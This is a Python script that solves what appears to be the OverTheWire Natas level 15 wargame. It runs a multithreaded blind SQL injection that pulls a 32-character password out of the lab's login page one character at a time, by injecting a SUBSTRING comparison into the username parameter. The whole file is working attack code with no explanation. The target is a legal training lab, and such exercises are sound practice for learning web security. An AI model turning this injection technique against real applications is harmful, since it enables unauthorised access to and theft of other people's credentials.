import requests
import string
from concurrent.futures import ThreadPoolExecutor

url = "http://natas15.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": "your_token",
    "User-Agent": "",
}
password = ""
charset = string.ascii_letters + string.digits  

def test_character(pos, char):
    payload = f'natas16" AND BINARY SUBSTRING(password, {pos}, 1) = "{char}" #'
    params = {"username": payload, "debug": "1"}

    print(f"[DEBUG] Testing payload: {payload}")  
    response = requests.get(url, params=params, headers=headers)

    return char if "This user exists." in response.text else None

while len(password) < 32:  
    with ThreadPoolExecutor(max_workers=20) as executor:  
        futures = {executor.submit(test_character, len(password) + 1, char): char for char in charset}
        
        for future in futures:
            result = future.result()
            if result:
                password += result
                print(f"[DEBUG] Found character: {result} | Password: {password}")
                break  
print(f"[RESULT] Leaked password: {password}")


